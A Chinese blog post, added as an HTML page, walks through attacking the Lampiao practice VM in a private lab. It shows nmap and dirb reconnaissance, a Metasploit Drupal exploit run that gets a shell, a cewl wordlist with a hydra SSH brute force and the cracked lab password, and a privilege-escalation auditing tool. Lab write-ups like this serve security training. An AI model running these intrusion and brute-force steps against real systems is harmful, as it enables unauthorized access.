@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tacgib.cn","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="友情提示：本文以及本站所有发布内容仅供学习研究之用，目的在于记录和分享学习心得，与同样的渗透爱好者进行交流，提升技术水平以便在工作中能够加以运用，保卫网络空间安全，对任何个人或组织的系统进行测试均需要获得其授权，否则后果自负！ 本靶场练习及整理笔记耗时大约5小时，使用到的信息收集技术包括端口扫描、页面枚举、目录爆破等，漏洞利用环节采用MSF直接漏洞利用，以及通过页面自动构造密码字典并爆破ssh两种">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透靶场笔记2：Lampiao">
+<meta property="og:url" content="https://tacgib.cn/2023/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B02%EF%BC%9ALampiao/index.html">
+<meta property="og:site_name" content="TACGIB CLUB">
+<meta property="og:description" content="友情提示：本文以及本站所有发布内容仅供学习研究之用，目的在于记录和分享学习心得，与同样的渗透爱好者进行交流，提升技术水平以便在工作中能够加以运用，保卫网络空间安全，对任何个人或组织的系统进行测试均需要获得其授权，否则后果自负！ 本靶场练习及整理笔记耗时大约5小时，使用到的信息收集技术包括端口扫描、页面枚举、目录爆破等，漏洞利用环节采用MSF直接漏洞利用，以及通过页面自动构造密码字典并爆破ssh两种">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674038539747.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674038860240.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674039163166.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674040816635.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674041035616.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674042770179.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674093262604.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674044683700.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674045213957.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674046071356.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674046527535.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674046595068.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674047246833.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674096315914.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674096363108.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674096406813.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674048096875.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674048453444.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674048643056.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674049537605.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674049775423.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674054433341.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674055598181.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674056080129.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674059258895.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674059258900.png">
+<meta property="og:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674060053799.png">
+<meta property="article:published_time" content="2023-01-19T03:21:35.947Z">
+<meta property="article:modified_time" content="2025-05-05T10:13:15.032Z">
+<meta property="article:author" content="秋风木叶">
+<meta property="article:tag" content="小书匠">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="Kali">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674038539747.png">
+
+<link rel="canonical" href="https://tacgib.cn/2023/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B02%EF%BC%9ALampiao/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>渗透靶场笔记2：Lampiao | TACGIB CLUB</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  
+  <script type="text/javascript" src="/js/my_js/clicklove.js"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">TACGIB CLUB</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">云影时空</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">107</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">92</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://tacgib.cn/2023/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B02%EF%BC%9ALampiao/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="秋风木叶">
+      <meta itemprop="description" content="一片宁静自由的空间……">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TACGIB CLUB">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          渗透靶场笔记2：Lampiao
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-01-19 11:21:35" itemprop="dateCreated datePublished" datetime="2023-01-19T11:21:35+08:00">2023-01-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-05 18:13:15" itemprop="dateModified" datetime="2025-05-05T18:13:15+08:00">2025-05-05</time>
+              </span>
+
+          
+            <span id="/2023/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B02%EF%BC%9ALampiao/" class="post-meta-item leancloud_visitors" data-flag-title="渗透靶场笔记2：Lampiao" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B02%EF%BC%9ALampiao/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B02%EF%BC%9ALampiao/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>友情提示：本文以及本站所有发布内容仅供学习研究之用，目的在于记录和分享学习心得，与同样的渗透爱好者进行交流，提升技术水平以便在工作中能够加以运用，保卫网络空间安全，对任何个人或组织的系统进行测试均需要获得其授权，否则后果自负！</p>
+<p>本靶场练习及整理笔记耗时大约5小时，使用到的信息收集技术包括端口扫描、页面枚举、目录爆破等，漏洞利用环节采用MSF直接漏洞利用，以及通过页面自动构造密码字典并爆破ssh两种策略获取shell，并列举了其他漏洞利用思路；提权环节认识到LES Linux权限提升审计工具，提权思路更加开阔。另外，本次本篇笔记较上一篇更加简洁，更便于阅读。</p>
+<a id="more"></a>
+
+<h2 id="0-配置网络环境"><a href="#0-配置网络环境" class="headerlink" title="0 配置网络环境"></a>0 配置网络环境</h2><p>局域网设备较多，所以不使用桥接方式，将靶机和Kali虚拟机网络都配置为：特定虚拟网络，选择VMnet1（仅主机模式）。</p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674038539747.png" alt="enter description here"></p>
+<h2 id="1-探测靶机IP"><a href="#1-探测靶机IP" class="headerlink" title="1 探测靶机IP"></a>1 探测靶机IP</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -sV -T5 -A 172.16.50.0/24</span><br></pre></td></tr></table></figure></div>
+<p>发现靶机IP为：172.16.50.130，且开启22、80端口<br>Kali IP为：172.16.50.128</p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674038860240.png" alt="enter description here"></p>
+<h2 id="2-靶机端口扫描"><a href="#2-靶机端口扫描" class="headerlink" title="2 靶机端口扫描"></a>2 靶机端口扫描</h2><p>进一步探测主机开放端口，发现除了22、80，还存在1898端口处于开启状态</p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674039163166.png" alt="enter description here"></p>
+<h2 id="3-访问Web页面信息收集"><a href="#3-访问Web页面信息收集" class="headerlink" title="3 访问Web页面信息收集"></a>3 访问Web页面信息收集</h2><p>访问80端口，<a href="http://172.16.50.130/" target="_blank" rel="noopener">http://172.16.50.130/</a><br>没有发现什么有用信息，提示说很简单。<br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674040816635.png" alt="enter description here"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"> _____ _   _                                                      </span><br><span class="line">|_   _| | ( )                                                     </span><br><span class="line">  | | | |_|<span class="regexp">/ ___    ___  __ _ ___ _   _                           </span></span><br><span class="line"><span class="regexp">  | | | __| /</span> __|  <span class="regexp">/ _ \/ _` /</span> __| | | |                          </span><br><span class="line"> _| |_| |_  \__ \ |  __/ (_| \__ \ |_| |_                         </span><br><span class="line"> \___/ \__| |___/  \___|\__,_|___/\__, ( )                        </span><br><span class="line">                                   __/ |<span class="regexp">/                         </span></span><br><span class="line"><span class="regexp">                                  |___/</span>                           </span><br><span class="line">______ _       _                                                _ </span><br><span class="line">|  ___(_)     | |                                              | |</span><br><span class="line">| |_   _    __| |_   _ _ __ ___   __ _    ___  __ _ _   _  __ _| |</span><br><span class="line">|  _| | |  <span class="regexp">/ _` | | | | '_ ` _ \ /</span> _<span class="string">` |  / _ \/ _`</span> | | | |<span class="regexp">/ _` | |</span></span><br><span class="line"><span class="regexp">| |   | | | (_| | |_| | | | | | | (_| | |  __/</span> (_| | |_| | (_| |_|</span><br><span class="line">\_|   |_|  \__,_|\__,_|_| |_| |_|\__,_|  \___|\__, |\__,_|\__,_(_)</span><br><span class="line">                                               __/ |              </span><br><span class="line">                                              |___/                                                                                    </span><br><span class="line">                                          ...                                  </span><br><span class="line">                           ./(<span class="regexp">/.         .,/</span>*<span class="regexp">/,..,.,..                         </span></span><br><span class="line"><span class="regexp">                       ,,                      ..  ,.,..,(                     </span></span><br><span class="line"><span class="regexp">                    %.                             .  ...,,.#                  </span></span><br><span class="line"><span class="regexp">                 .&amp;..                                    . .,.#                </span></span><br><span class="line">               (.                                      .,/,/, .*#.             </span><br><span class="line">            .#.                                             .,. .(#            </span><br><span class="line">           (,                                                **, .#%           </span><br><span class="line">         .%                                                    <span class="regexp">/,..(#          </span></span><br><span class="line"><span class="regexp">        .,                                                      ((.,@*.        </span></span><br><span class="line"><span class="regexp">       ..                           .,,      .                  ./</span>( ,<span class="comment">//        </span></span><br><span class="line">       (...                 *(#&amp;@@@@@@@@@@@@@@#/.                .,/*%,*       </span><br><span class="line">      %(..               (@@@#   . ( / ,.%@@@@@@@@@@#,*,..  *     .,,*&amp;(       </span><br><span class="line">      @.           ,/#@@@@,  .   .  .,.    .*(@@@@@@@@%%@@@@@(/...,(*,@,,      </span><br><span class="line">     *@.       /#@@@@@@@@ ../*/,..             .&amp;@@@@@@@@@@@&amp;((%(./(/#&amp;&amp;(      </span><br><span class="line">     &amp;(    .(@@@@@@@@@@@,        <span class="comment">/*.     (@@%@@@@(##@@@@@@@@@@&amp;@@###%/(@(      </span></span><br><span class="line"><span class="comment">    /@%/#&amp;&amp;@@@@@@*  @@@@    #%##&amp;&amp;&amp;@&amp;(  (@@%%%&amp;&amp;@@@%@@@@(.&amp;@@@@@@@%%###@(.     </span></span><br><span class="line"><span class="comment">    &amp;@@@@@@@@#.     ,@@@%*(@@%%/(&amp;.@@&amp;/%@@#,.#.%,&amp;%&amp;@%*   .%@@@@@@&amp;*(@@%     </span></span><br><span class="line"><span class="comment">    %@@@@%,          .@@*   /*,%&amp;%(@.%  (@./. *(*.@%*@@&amp;        *%@@@@%&amp;@(     </span></span><br><span class="line"><span class="comment">    .@&amp;               %@% *. #. .(% ,.  *@#.  .  #.((@,             /@@@@%     </span></span><br><span class="line">     ###               #&amp;(*/.  *#*#@#    @&amp;/  , ,,(/&amp;(                *@@%     </span><br><span class="line">     &amp;(%.                  *(,    (@,    @ <span class="comment">//*. /*/.,                 #@     </span></span><br><span class="line">    ,%@@/                  .,/,.  .# (&amp;%@@@% .% (/((             @.&amp;/ ,%(/,    </span><br><span class="line">     (#                   ./#* ,#.   *@*&amp;,,/,(#, &amp;%(          #%*@  %@/##    </span><br><span class="line">     @&amp;/%                    .&amp;&amp;*,@%%&amp;@@@@#*, ./*.@. ((         **%#. (&amp;(#*,   </span><br><span class="line">     %@#%*                     @, (/*.(@@@@@%#*.#@/   ,,&amp;      .%#@#   &amp;(( #   </span><br><span class="line">     .&amp;(,                        %<span class="comment">/*#*,.   ,,@@ .  .*.*@     (/@@.   *#(   </span></span><br><span class="line"><span class="comment">                                   /@%#,,/,,&amp;@@(.   (&amp;   &amp;@&amp;,&amp;*@&amp;     %,(    </span></span><br><span class="line"><span class="comment">                 #..&amp;%               ,@&amp;. /%@@(  .&amp;@* #/@@%*/</span>*<span class="regexp">/.(@# *%.        </span></span><br><span class="line">             ,.&amp;*  * ..,((.    .#  .%@@@&amp;@&amp;.  (@@ *&amp;@@@/. . @ @&amp;((&amp;@@/#.     </span><br><span class="line">         ,&amp;. .*&amp;/@*&amp;,   ,/.   .&amp;(   %. %%#.#   &amp;&amp;.%@@&amp;@*.    .%,@&amp;./.(.*%@&amp;%,  </span><br><span class="line">       ,/  /@@@%#&amp;@@,.&amp;/   .**  ./&amp;* .#,(   .#@@@@# ,%,,.   .*,%@/.*, (..(@@,%%</span><br><span class="line">    <span class="comment">/*,@@@%&amp;(%*@@@@&amp; (,@#.  ,( . /,*&amp;@@,(@@@*    ...   **(,&amp;@,*,* .%/@&amp;%**.</span></span><br><span class="line">    @&amp;&amp;@@@,///#@@@@@@, ( /@*(*/# .(/&amp;..* *@%,. &amp;,*(,. .%@@*.%@%..,***%@@ .*%,</span><br><span class="line">    @#,@&amp;@@&amp;&amp;**#*/&amp;@@@@@@*,.%*@@*/,,//* %   /@..,,#(/,.&amp;@&amp;*%  @@((,,(//@@#*  *%</span><br><span class="line">    #&amp; .#@@@@*,/(*@@@@@@@@&amp; %.@*&amp;@&amp;,(%. &amp;  . @*.*../@@, ..%,/  ##/.%@@@(..,(%</span><br><span class="line">    .*. (@@@@@*,((@%&amp;@@@@@@@@*  <span class="comment">//&amp;  ,@  ..@@#%%#,(&amp;@@/*/%#,   ,@*.%@@@*,*.,#</span></span><br><span class="line">     .  (@@@@@%.,@&amp;&amp;&amp;@@@@@%@@@**&amp;@(,/  *#  /% @/@@@@&amp;@@* /// .( . .#*#@@&amp;/ ..*&amp;</span><br><span class="line">       .,@@@@@@/%@%%#&amp;@@@#@@@@@( ./#.  #,  ,. &amp;/.,@@@@@(%&amp;@/*   /...@%@@@ .,.(%</span><br><span class="line">       .,&amp;&amp;@@@@(##%@@@%@@@&amp;,*.,,%#   #      #@, /@@@. ,,,  .  .*.  &amp;@@@.. ,*/</span><br><span class="line">        .((@@@@#%* .#@#%@@(....((@@/   ,   ,  /@@&amp;@// ,#@@#  ,..    &amp;@@*. ..*</span><br><span class="line">         /,@@@@%@,  /%@@* . .*/&amp;(#%        .  /@@@@@#.(##@   *., .  ,  %##..,./</span><br></pre></td></tr></table></figure>
+
+
+<p>我们继续访问1898端口，<a href="http://172.16.50.130:1898/" target="_blank" rel="noopener">http://172.16.50.130:1898/</a><br>发现名为Lampião的页面<img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674041035616.png" alt="enter description here"></p>
+<h2 id="4-页面枚举，发现价值信息"><a href="#4-页面枚举，发现价值信息" class="headerlink" title="4 页面枚举，发现价值信息"></a>4 页面枚举，发现价值信息</h2><p>点击右下角“Read more”，观察URL，可进行页面枚举，<a href="http://172.16.50.130:1898/?q=node/1" target="_blank" rel="noopener">http://172.16.50.130:1898/?q=node/1</a><br>在第二个页面发现有价值信息，一个音频文件和一个图片：<br>audio.m4a<br>qrc.png<br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674042770179.png" alt="enter description here"><br>尝试访问以上两个文件：<br><a href="http://172.16.50.130:1898/audio.m4a" target="_blank" rel="noopener">http://172.16.50.130:1898/audio.m4a</a><br><a href="http://172.16.50.130:1898/qrc.png" target="_blank" rel="noopener">http://172.16.50.130:1898/qrc.png</a></p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674093262604.png" alt="enter description here"><br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674044683700.png" alt="enter description here"></p>
+<p>语音可以获取到用户名：tiago<br>通过扫描二维码可以获取到信息：Try harder! muahuahua<br>需要爆破口令<br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674045213957.png" alt="enter description here"></p>
+<h2 id="5-网站目录爆破"><a href="#5-网站目录爆破" class="headerlink" title="5 网站目录爆破"></a>5 网站目录爆破</h2><p>使用DirB爆破网站目录，发现存在一个robots.txt文件<br>dirb <a href="http://172.16.50.130:1898/" target="_blank" rel="noopener">http://172.16.50.130:1898/</a><br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674046071356.png" alt="enter description here"></p>
+<p>查看robots.txt文件，发现一些文件，第一个文件是“CHANGELOG.txt”，尝试打开<br><a href="http://172.16.50.130:1898//CHANGELOG.txt" target="_blank" rel="noopener">http://172.16.50.130:1898//CHANGELOG.txt</a><br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674046527535.png" alt="enter description here"></p>
+<p>发现一个关键信息，Drupal 7.54, 2017-02-01<br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674046595068.png" alt="enter description here"></p>
+<h2 id="6-漏洞利用"><a href="#6-漏洞利用" class="headerlink" title="6 漏洞利用"></a>6 漏洞利用</h2><h3 id="6-1-MSF获取Shell"><a href="#6-1-MSF获取Shell" class="headerlink" title="6.1 MSF获取Shell"></a>6.1 MSF获取Shell</h3><p>该版本可能存在可利用漏洞，直接kali中查找：searchsploit Drupal</p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674047246833.png" alt="enter description here"><br>我们打开MSF<br>─$ msfconsole<br>msf6 &gt; search Drupal<br>msf6 &gt; use 1<br>set RHOST 172.16.50.130<br>set RPORT 1898<br>set LHOST 172.16.50.128<br>run<br>成功获取shell</p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674096315914.png" alt="enter description here"><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674096363108.png" alt="enter description here"><br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674096406813.png" alt="enter description here"></p>
+<h3 id="6-2-获取权限的另一种思路——ssh口令爆破"><a href="#6-2-获取权限的另一种思路——ssh口令爆破" class="headerlink" title="6.2 获取权限的另一种思路——ssh口令爆破"></a>6.2 获取权限的另一种思路——ssh口令爆破</h3><p>ssh口令爆破</p>
+<h4 id="6-2-1-通过网站页面构造密码字典"><a href="#6-2-1-通过网站页面构造密码字典" class="headerlink" title="6.2.1 通过网站页面构造密码字典"></a>6.2.1 通过网站页面构造密码字典</h4><p>首先通过cewl构造密码字典<br>cewl <a href="http://10.211.55.9:1898/?q=node/1" target="_blank" rel="noopener">http://10.211.55.9:1898/?q=node/1</a> -2 frank.txt</p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674048096875.png" alt="enter description here"></p>
+<h4 id="6-2-2-使用构造的密码字典爆破ssh"><a href="#6-2-2-使用构造的密码字典爆破ssh" class="headerlink" title="6.2.2 使用构造的密码字典爆破ssh"></a>6.2.2 使用构造的密码字典爆破ssh</h4><p>使用构造的字典爆破ssh，用户名：tiago<br>hydra -l tiago -P frank.txt 172.16.50.130 ssh<br>爆破成功！<br>[22][ssh] host: 172.16.50.130   login: tiago   password: Virgulino<br>通过ssh登录靶机，是低权限用户，需要提权。</p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674048453444.png" alt="enter description here"><br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674048643056.png" alt="enter description here"></p>
+<h3 id="6-3-其他思路"><a href="#6-3-其他思路" class="headerlink" title="6.3 其他思路"></a>6.3 其他思路</h3><p>还可以直接使用漏扫，如Xray等，结合BurpSuite，可以发现其他漏洞来利用。</p>
+<h2 id="7-提权！"><a href="#7-提权！" class="headerlink" title="7 提权！"></a>7 提权！</h2><h3 id="7-1-审计可用提权漏洞"><a href="#7-1-审计可用提权漏洞" class="headerlink" title="7.1 审计可用提权漏洞"></a>7.1 审计可用提权漏洞</h3><h4 id="7-1-1-LES-Linux提权审计工具介绍"><a href="#7-1-1-LES-Linux提权审计工具介绍" class="headerlink" title="7.1.1 LES Linux提权审计工具介绍"></a>7.1.1 LES Linux提权审计工具介绍</h4><p>Google：Linux suggest exploit<br><a href="https://github.com/The-Z-Labs/linux-exploit-suggester" target="_blank" rel="noopener">https://github.com/The-Z-Labs/linux-exploit-suggester</a></p>
+<p>找到一款神器！</p>
+<p><strong>LES：Linux提权审计工具</strong><br>LES 工具旨在帮助检测给定 Linux 内核/基于 Linux 的机器的安全缺陷。 它提供以下功能：<br>1、评估内核对公开漏洞的暴露<br>工具评估目标内核在每个公开的 Linux 内核漏洞利用中的暴露情况。对于每个漏洞，都会计算暴露程度。<br>2、验证内核强化安全措施的状态<br>LES 可以检查 Linux 内核可用的大部分安全设置。 它不仅验证内核编译时配置 (CONFIG)，还验证运行时设置 (sysctl)，从而更全面地了解运行内核的安全状况。 此功能是 Tobias Klein 的 checksec.sh 工具 –kernel switch 的现代延续。</p>
